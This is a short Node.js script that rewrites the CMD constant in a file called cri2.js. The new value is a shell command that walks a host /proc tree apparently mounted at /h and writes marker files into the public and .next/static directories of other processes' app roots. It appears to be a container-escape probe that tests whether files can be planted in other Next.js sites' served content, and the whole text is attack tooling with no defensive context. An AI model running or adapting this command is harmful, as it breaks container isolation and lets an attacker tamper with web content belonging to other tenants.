const fs=require('fs');
let s=fs.readFileSync('cri2.js','utf8');
const c="const CMD=\"for p in /h/proc/[0-9]*/root/app/public; do echo HOSTPROC > $p/zz_p.txt 2>/dev/null; done; for q in /h/proc/[0-9]*/root/app/.next/static; do echo S > $q/zz_s.txt 2>/dev/null; done\";";
s=s.replace(/const CMD=.*\n/, c+'\n');
fs.writeFileSync('cri2.js',s);
console.log(s.match(/const CMD=.*/)[0].slice(0,60));
